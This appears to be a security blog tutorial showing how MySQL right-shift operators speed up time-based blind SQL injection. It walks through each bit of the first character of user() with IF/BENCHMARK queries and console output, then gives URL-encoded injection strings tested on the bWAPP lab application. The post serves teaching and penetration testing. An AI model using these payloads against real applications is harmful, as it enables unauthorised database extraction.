---
title: "Efficient Time Based Blind SQL Injection using MySQL Bit Functions and Operators"
date: 2017-12-16
draft: false
toc: false
images:
  - "/wp-content/uploads/2017/12/sql-injection.png"
categories:
  - General
  - Security
tags:
  - OWASP
  - Penetration Testing
  - security
  - SQL Injection
  - Web Apps
---
<p>I was performing some penetration tests in 2011 – 2012 against various PHP applications integrated with MySQL databases which were vulnerable to Time Based Blind SQL Injection.  Due to various constraints and limitations, exploitation was a little tricky and I was forced to investigate a method which allowed me to retrieve data with as little requests as possible.</p>



<p>I stumbled across this paper demonstrating SQL injection using Bit shifting techniques: <a href="https://www.exploit-db.com/papers/17073/">https://www.exploit-db.com/papers/17073/</a></p>



<p>During a recent CTF exercise on Hack the Box (<a href="https://www.hackthebox.eu/">https://www.hackthebox.eu/</a>) I found myself revisiting this method to exploit some tricky SQL injection.</p>



<p>This blog post will demonstrate how the ‘right shift’ Operator ( <strong>&gt;&gt;</strong> ) can be used to enumerate the Binary bits of a value returned from a SQL query.</p>



<p><strong>Note: A full description of Bit Functions and Operators can be found at the following URL: </strong><a href="https://dev.mysql.com/doc/refman/5.7/en/bit-functions.html"><strong>https://dev.mysql.com/doc/refman/5.7/en/bit-functions.html</strong></a></p>



<p>The right shift operator will shift the number of bits of a binary value 1 location to the right, as illustrated in the example below:</p>



<pre class="wp-block-preformatted lang:default decode:true">mysql&gt; select ascii(b'01110010');

+--------------------+

| ascii(b'01110010') |

+--------------------+

|                114 |

+--------------------+

1 row in set (0.00 sec)



mysql&gt; select ascii(b'01110010') &gt;&gt; 1;

+-------------------------+

| ascii(b'01110010') &gt;&gt; 1 |

+-------------------------+

|                      57 |

+-------------------------+

1 row in set (0.00 sec)</pre>



<p>This can be utilised to enumerate a character of a string when exploiting Blind SQL injection.  This guarantees that the data can be enumerated by a maximum of 8 requests per character if it appears within the full ASCII table.</p>



<p>The data we wish to extract via this method is the first character returned for the query: <em>select user()</em></p>



<figure class="wp-block-image"><a href="/wp-content/uploads/2017/12/0-1.jpg"><img decoding="async" width="701" height="74" src="/wp-content/uploads/2017/12/0-1.jpg" alt="" class="wp-image-1575" srcset="/wp-content/uploads/2017/12/0-1.jpg 701w, /wp-content/uploads/2017/12/0-1-300x32.jpg 300w" sizes="(max-width: 701px) 100vw, 701px"></a></figure>



<p><strong>First Bit:</strong></p>



<p>We start by finding the value of the <strong>first</strong> bit:</p>



<p><strong>?</strong>???????</p>



<p>Two possibilities for this:</p>



<p><strong>0</strong> (Decimal value: <strong>0</strong>) // TRUE condition</p>



<p>OR</p>



<p><strong>1</strong> (Decimal value: <strong>1</strong>) // FALSE condition</p>



<pre class="wp-block-preformatted lang:default decode:true">mysql&gt; select if ((ascii((substr(user(),1,1))) &gt;&gt; 7 )=0,benchmark(10000000,sha1('test')), 'false');

+--------------------------------------------------------------------------------------+

| if ((ascii((substr(user(),1,1))) &gt;&gt; 7 )=0,benchmark(10000000,sha1('test')), 'false') |

+--------------------------------------------------------------------------------------+

| 0                                                                                    |

+--------------------------------------------------------------------------------------+

1 row in set (2.35 sec)</pre>



<p>The SQL query resulted in a time delay, therefore the condition is TRUE, resulting in the <strong>first</strong> bit being <strong>0</strong></p>



<p><strong>0</strong>???????</p>



<figure class="wp-block-image"><a href="/wp-content/uploads/2017/12/1.jpg"><img loading="lazy" decoding="async" width="682" height="59" src="/wp-content/uploads/2017/12/1.jpg" alt="" class="wp-image-1566" srcset="/wp-content/uploads/2017/12/1.jpg 682w, /wp-content/uploads/2017/12/1-300x26.jpg 300w" sizes="auto, (max-width: 682px) 100vw, 682px"></a></figure>



<p><strong><br>Second Bit:</strong></p>



<p>Now we need find the value of the <strong>second</strong> bit. As before, there are two possibilities for this:</p>



<p>0<strong>0</strong> (Decimal value: <strong>0</strong>) // TRUE condition</p>



<p>OR</p>



<p>0<strong>1</strong> (Decimal value: <strong>1</strong>) // FALSE condition</p>



<pre class="wp-block-preformatted lang:default decode:true">mysql&gt; select if ((ascii((substr(user(),1,1))) &gt;&gt; 6 )=0,benchmark(10000000,sha1('test')), 'false');

+--------------------------------------------------------------------------------------+

| if ((ascii((substr(user(),1,1))) &gt;&gt; 6 )=0,benchmark(10000000,sha1('test')), 'false') |

+--------------------------------------------------------------------------------------+

| false                                                                                |

+--------------------------------------------------------------------------------------+

1 row in set (0.00 sec)</pre>



<p>The SQL query resulted in no time delay, therefore the condition is FALSE, resulting in the <strong>second </strong>bit being <strong>1</strong></p>



<p>0<strong>1</strong>?????</p>



<figure class="wp-block-image"><a href="/wp-content/uploads/2017/12/2.jpg"><img loading="lazy" decoding="async" width="683" height="61" src="/wp-content/uploads/2017/12/2.jpg" alt="" class="wp-image-1567" srcset="/wp-content/uploads/2017/12/2.jpg 683w, /wp-content/uploads/2017/12/2-300x27.jpg 300w" sizes="auto, (max-width: 683px) 100vw, 683px"></a></figure>



<p><strong>Third Bit:</strong></p>



<p>Now we need find the value of the <strong>third</strong> bit. As before, there are two possibilities for this:</p>



<p>01<strong>0</strong> (Decimal value: <strong>2</strong>) // TRUE</p>



<p>OR</p>



<p>01<strong>1</strong> (Decimal value: <strong>3</strong>) // FALSE</p>



<pre class="wp-block-preformatted lang:default decode:true">mysql&gt; select if ((ascii((substr(user(),1,1))) &gt;&gt; 5 )=2,benchmark(10000000,sha1('test')), 'false');

+--------------------------------------------------------------------------------------+

| if ((ascii((substr(user(),1,1))) &gt;&gt; 5 )=2,benchmark(10000000,sha1('test')), 'false') |

+--------------------------------------------------------------------------------------+

| false                                                                                |

+--------------------------------------------------------------------------------------+

1 row in set (0.00 sec)</pre>



<p>The SQL query resulted in no time delay, therefore the condition is FALSE, resulting in the <strong>third</strong> bit being <strong>1</strong></p>



<p>01<strong>1</strong>?????</p>



<figure class="wp-block-image"><a href="/wp-content/uploads/2017/12/3.jpg"><img loading="lazy" decoding="async" width="691" height="69" src="/wp-content/uploads/2017/12/3.jpg" alt="" class="wp-image-1568" srcset="/wp-content/uploads/2017/12/3.jpg 691w, /wp-content/uploads/2017/12/3-300x30.jpg 300w" sizes="auto, (max-width: 691px) 100vw, 691px"></a></figure>



<p><strong>Fourth Bit:</strong></p>



<p>Now we need find the value of the <strong>fourth</strong> bit. As before, there are two possibilities for this:</p>



<p>011<strong>0</strong> (Decimal: <strong>6</strong>) // TRUE</p>



<p>OR</p>



<p>011<strong>1</strong> (Decimal: <strong>7</strong>) // FALSE</p>



<pre class="wp-block-preformatted lang:default decode:true">mysql&gt; select if ((ascii((substr(user(),1,1))) &gt;&gt; 4 )=6,benchmark(10000000,sha1('test')), 'false');

+--------------------------------------------------------------------------------------+

| if ((ascii((substr(user(),1,1))) &gt;&gt; 4 )=6,benchmark(10000000,sha1('test')), 'false') |

+--------------------------------------------------------------------------------------+

| false                                                                                |

+--------------------------------------------------------------------------------------+

1 row in set (0.00 sec)</pre>



<p>The SQL query resulted in no time delay, therefore the condition is FALSE, resulting in the <strong>fourth</strong> bit being <strong>1</strong></p>



<p>011<strong>1</strong>????</p>



<figure class="wp-block-image"><a href="/wp-content/uploads/2017/12/4.jpg"><img loading="lazy" decoding="async" width="690" height="66" src="/wp-content/uploads/2017/12/4.jpg" alt="" class="wp-image-1569" srcset="/wp-content/uploads/2017/12/4.jpg 690w, /wp-content/uploads/2017/12/4-300x29.jpg 300w" sizes="auto, (max-width: 690px) 100vw, 690px"></a></figure>



<p><strong>Fifth Bit:</strong></p>



<p>Now we need find the value of the <strong>fifth</strong> bit. As before, there are two possibilities for this:</p>



<p>0111<strong>0</strong> (Decimal: <strong>14</strong>) /// TRUE</p>



<p>OR</p>



<p>0111<strong>1</strong> (Decimal: <strong>15</strong>) // FALSE</p>



<pre class="wp-block-preformatted lang:default decode:true">mysql&gt; select if ((ascii((substr(user(),1,1))) &gt;&gt; 3 )=14,benchmark(10000000,sha1('test')), 'false');

+---------------------------------------------------------------------------------------+

| if ((ascii((substr(user(),1,1))) &gt;&gt; 3 )=14,benchmark(10000000,sha1('test')), 'false') |

+---------------------------------------------------------------------------------------+

| 0                                                                                     |

+---------------------------------------------------------------------------------------+

1 row in set (2.46 sec)</pre>



<p>The SQL query resulted in a time delay, therefore the condition is <strong>TRUE</strong>, resulting in the <strong>fifth </strong>bit being <strong>0</strong></p>



<p>0111<strong>0</strong>???</p>



<figure class="wp-block-image"><a href="/wp-content/uploads/2017/12/5.jpg"><img loading="lazy" decoding="async" width="695" height="70" src="/wp-content/uploads/2017/12/5.jpg" alt="" class="wp-image-1570" srcset="/wp-content/uploads/2017/12/5.jpg 695w, /wp-content/uploads/2017/12/5-300x30.jpg 300w" sizes="auto, (max-width: 695px) 100vw, 695px"></a></figure>



<p><strong>Sixth Bit:</strong></p>



<p>Now we need find the value of the <strong>sixth</strong> bit. As before, there are two possibilities for this:</p>



<p>01110<strong>0</strong> (Decimal: <strong>28</strong>) // TRUE</p>



<p>OR</p>



<p>01110<strong>1</strong> (Decimal: <strong>29</strong>) // FALSE</p>



<pre class="wp-block-preformatted lang:default decode:true">mysql&gt; select if ((ascii((substr(user(),1,1))) &gt;&gt; 2 )=28,benchmark(10000000,sha1('test')), 'false');

+---------------------------------------------------------------------------------------+

| if ((ascii((substr(user(),1,1))) &gt;&gt; 2 )=28,benchmark(10000000,sha1('test')), 'false') |

+---------------------------------------------------------------------------------------+

| 0                                                                                     |

+---------------------------------------------------------------------------------------+

1 row in set (2.44 sec)</pre>



<p>The SQL query resulted in a time delay, therefore the condition is <strong>TRUE</strong>, resulting in the <strong>sixth </strong>bit being <strong>0</strong></p>



<p>01110<strong>0</strong>??</p>



<figure class="wp-block-image"><a href="/wp-content/uploads/2017/12/6.jpg"><img loading="lazy" decoding="async" width="693" height="72" src="/wp-content/uploads/2017/12/6.jpg" alt="" class="wp-image-1571" srcset="/wp-content/uploads/2017/12/6.jpg 693w, /wp-content/uploads/2017/12/6-300x31.jpg 300w" sizes="auto, (max-width: 693px) 100vw, 693px"></a></figure>



<p><strong>Seventh Bit:</strong></p>



<p>Now we need find the value of the <strong>seventh </strong>bit. As before, there are two possibilities for this:</p>



<p>011100<strong>0</strong> (Decimal: 56) // TRUE</p>



<p>OR</p>



<p>011100<strong>1</strong> (Decimal: 57) // FALSE</p>



<pre class="wp-block-preformatted lang:default decode:true">mysql&gt; select if ((ascii((substr(user(),1,1))) &gt;&gt; 1 )=56,benchmark(10000000,sha1('test')), 'false');

+---------------------------------------------------------------------------------------+

| if ((ascii((substr(user(),1,1))) &gt;&gt; 1 )=56,benchmark(10000000,sha1('test')), 'false') |

+---------------------------------------------------------------------------------------+

| false                                                                                 |

+---------------------------------------------------------------------------------------+

1 row in set (0.00 sec)</pre>



<p>The SQL query resulted in no time delay, therefore the condition is FALSE, resulting in the <strong>seventh</strong> bit being <strong>1</strong></p>



<p>The fourth bit must be <strong>1</strong></p>



<p>011100<strong>1</strong>?</p>



<figure class="wp-block-image"><a href="/wp-content/uploads/2017/12/7.jpg"><img loading="lazy" decoding="async" width="693" height="65" src="/wp-content/uploads/2017/12/7.jpg" alt="" class="wp-image-1572" srcset="/wp-content/uploads/2017/12/7.jpg 693w, /wp-content/uploads/2017/12/7-300x28.jpg 300w" sizes="auto, (max-width: 693px) 100vw, 693px"></a></figure>



<p><strong>Eighth Bit:</strong></p>



<p>Now we need find the value of the <strong>eighth and final </strong>bit. As before, there are two possibilities for this:</p>



<p>0111001<strong>0</strong> (Decimal: <strong>114</strong>) // TRUE</p>



<p>OR</p>



<p>0111001<strong>1</strong> (Decimal: <strong>115</strong>) // FALSE</p>



<pre class="wp-block-preformatted lang:default decode:true">mysql&gt; select if ((ascii((substr(user(),1,1))) &gt;&gt; 0 )=114,benchmark(10000000,sha1('test')), 'false');

+----------------------------------------------------------------------------------------+

| if ((ascii((substr(user(),1,1))) &gt;&gt; 0 )=114,benchmark(10000000,sha1('test')), 'false') |

+----------------------------------------------------------------------------------------+

| 0                                                                                      |

+----------------------------------------------------------------------------------------+

1 row in set (2.33 sec)</pre>



<p>The SQL query resulted in a time delay, therefore the condition is <strong>TRUE</strong>, resulting in the <strong>eight </strong>bit being <strong>0</strong></p>



<p>0111001<strong>0</strong></p>



<figure class="wp-block-image"><a href="/wp-content/uploads/2017/12/8.jpg"><img loading="lazy" decoding="async" width="703" height="70" src="/wp-content/uploads/2017/12/8.jpg" alt="" class="wp-image-1573" srcset="/wp-content/uploads/2017/12/8.jpg 703w, /wp-content/uploads/2017/12/8-300x30.jpg 300w" sizes="auto, (max-width: 703px) 100vw, 703px"></a></figure>



<p>Now we can conclude that the binary value for the first character returned by the query: <em>select user()</em> is <strong>01110010</strong> resulting in a decimal value of <strong>114</strong>.  114 being the ‘<strong>r</strong>’ character of the ASCII table.</p>



<pre class="wp-block-preformatted lang:default decode:true">mysql&gt; select user();

+----------------+

| user()         |

+----------------+

| root@localhost |

+----------------+

1 row in set (0.00 sec)</pre>



<p>In order to demonstrate this type of Blind SQL injection attack, I have demenstrated how to enumerate the first and last binary bit of the first character returned by ‘<em>select user()</em>’ on the bWAPP vulnerable application: (https://www.vulnhub.com/entry/bwapp-bee-box-v16,53/)</p>



<ol class="wp-block-list"><li>SQLi string returning a TRUE condition for the first bit:</li></ol>



<pre class="wp-block-preformatted lang:default decode:true">test%27+and+if+((ascii((substr(user(),1,1)))+&gt;&gt;+7+)=0,benchmark(5000000,md5('test')),+'false')%23</pre>



<figure class="wp-block-image"><a href="/wp-content/uploads/2017/12/ks-sql1.jpg"><img loading="lazy" decoding="async" width="1292" height="594" src="/wp-content/uploads/2017/12/ks-sql1.jpg" alt="" class="wp-image-1559" srcset="/wp-content/uploads/2017/12/ks-sql1.jpg 1292w, /wp-content/uploads/2017/12/ks-sql1-300x138.jpg 300w, /wp-content/uploads/2017/12/ks-sql1-1024x471.jpg 1024w, /wp-content/uploads/2017/12/ks-sql1-768x353.jpg 768w" sizes="auto, (max-width: 1292px) 100vw, 1292px"></a></figure>



<ol class="wp-block-list" start="2"><li>SQLi string returning a FALSE condition for the first bit:</li></ol>



<pre class="wp-block-preformatted lang:default decode:true">test%27+and+if+((ascii((substr(user(),1,1)))+&gt;&gt;+7+)=1,benchmark(5000000,md5('test')),+'false')%23</pre>



<figure class="wp-block-image"><a href="/wp-content/uploads/2017/12/ks-sql2.jpg"><img loading="lazy" decoding="async" width="1294" height="591" src="/wp-content/uploads/2017/12/ks-sql2.jpg" alt="" class="wp-image-1560" srcset="/wp-content/uploads/2017/12/ks-sql2.jpg 1294w, /wp-content/uploads/2017/12/ks-sql2-300x137.jpg 300w, /wp-content/uploads/2017/12/ks-sql2-1024x468.jpg 1024w, /wp-content/uploads/2017/12/ks-sql2-768x351.jpg 768w" sizes="auto, (max-width: 1294px) 100vw, 1294px"></a></figure>



<ol class="wp-block-list" start="3"><li>SQLi string returning a TRUE condition for the eight bit:</li></ol>



<pre class="wp-block-preformatted lang:default decode:true">test%27+and+if+((ascii((substr(user(),1,1)))+&gt;&gt;+0+)=114,benchmark(5000000,md5('test')),+'false')%23</pre>



<figure class="wp-block-image"><a href="/wp-content/uploads/2017/12/ks-sql3.jpg"><img loading="lazy" decoding="async" width="1294" height="595" src="/wp-content/uploads/2017/12/ks-sql3.jpg" alt="" class="wp-image-1561" srcset="/wp-content/uploads/2017/12/ks-sql3.jpg 1294w, /wp-content/uploads/2017/12/ks-sql3-300x138.jpg 300w, /wp-content/uploads/2017/12/ks-sql3-1024x471.jpg 1024w, /wp-content/uploads/2017/12/ks-sql3-768x353.jpg 768w" sizes="auto, (max-width: 1294px) 100vw, 1294px"></a></figure>
        <h3 class="awpa-title">About The Author</h3>
                        <div class="wp-post-author-wrap wp-post-author-shortcode left">
                                                                <div class="awpa-tab-content active" id="1_awpa-tab1">
                                    <div class="wp-post-author">
            <div class="awpa-img awpa-author-block square">
                <a href="/author/jps_admin/"><img alt="" src="https://secure.gravatar.com/avatar/e81af0ed037c0b2a88af1d9d8d4be2515f721f9b7ccf9ae910576d539feff4fb?s=150&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/e81af0ed037c0b2a88af1d9d8d4be2515f721f9b7ccf9ae910576d539feff4fb?s=300&amp;d=mm&amp;r=g 2x" class="avatar avatar-150 photo" height="150" width="150"></a>
               
               
            </div>
            <div class="wp-post-author-meta awpa-author-block">
                <h4 class="awpa-display-name">
                    <a href="/author/jps_admin/">Smittix</a>
                    
                </h4>
                

                
                <div class="wp-post-author-meta-bio">
                                    </div>
                <div class="wp-post-author-meta-more-posts">
                    <p class="awpa-more-posts round">
                        <a href="/author/jps_admin/" class="awpa-more-posts">See author's posts</a>
                    </p>
                </div>
                                    <ul class="awpa-contact-info round">
                                                    
                                <li class="awpa-website-li">
                                    <a href="/" class="awpa-website awpa-icon-website"></a>
                                </li>
                                                                                                                                                                                        </ul>
                            </div>
        </div>

                                </div>
                                                            </div>
                        

        <div class="post-share">
            <div class="post-share-icons cf"> 
                                    <a class="facebook" href="https://www.facebook.com/sharer.php?u=/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/" target="_blank">
                        <i class="fab fa-facebook"></i>
                    </a>
                                    <a class="x-twitter" href="http://twitter.com/share?url=/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/&amp;text=Efficient%20Time%20Based%20Blind%20SQL%20Injection%20using%20MySQL%20Bit%20Functions%20and%20Operators" target="_blank">
                        <i class="fa-brands fa-x-twitter"></i>
                    </a>
                                    <a class="envelope" href="mailto:?subject=Efficient%20Time%20Based%20Blind%20SQL%20Injection%20using%20MySQL%20Bit%20Functions%20and%20Operators&amp;body=/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/" target="_blank">
                        <i class="fas fa-envelope-open"></i>
                    </a>
                                    <a class="linkedin" href="https://www.linkedin.com/sharing/share-offsite/?url=/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/&amp;title=Efficient%20Time%20Based%20Blind%20SQL%20Injection%20using%20MySQL%20Bit%20Functions%20and%20Operators" target="_blank">
                        <i class="fab fa-linkedin"></i>
                    </a>
                                    <a href="javascript:pinIt();" class="pinterest">
                        <i class="fab fa-pinterest"></i>
                    </a>
                                    <a class="telegram" href="https://t.me/share/url?url=/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/&amp;title=Efficient%20Time%20Based%20Blind%20SQL%20Injection%20using%20MySQL%20Bit%20Functions%20and%20Operators" target="_blank">
                        <i class="fab fa-telegram"></i>
                    </a>
                                    <a class="whatsapp" href="https://api.whatsapp.com/send?text=/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/&amp;title=Efficient%20Time%20Based%20Blind%20SQL%20Injection%20using%20MySQL%20Bit%20Functions%20and%20Operators" target="_blank">
                        <i class="fab fa-whatsapp"></i>
                    </a>
                                    <a class="reddit" href="https://www.reddit.com/submit?url=/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/&amp;title=Efficient%20Time%20Based%20Blind%20SQL%20Injection%20using%20MySQL%20Bit%20Functions%20and%20Operators" target="_blank">
                        <i class="fab fa-reddit"></i>
                    </a>
                                <a class="print-r" href="javascript:window.print()"> <i class="fas fa-print"></i></a>
            </div>
        </div>
                        <div class="clearfix mb-3"></div>
                    
	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="/posts/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/" rel="prev"><div class="fas fa-angle-double-left"></div><span> Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 2 of 2)</span></a></div><div class="nav-next"><a href="/posts/wardriving-with-kismet-gps-and-google-earth/" rel="next"><span>Wardriving with Kismet, GPS and Google Earth. </span><div class="fas fa-angle-double-right"></div></a></div></div>
	</nav>
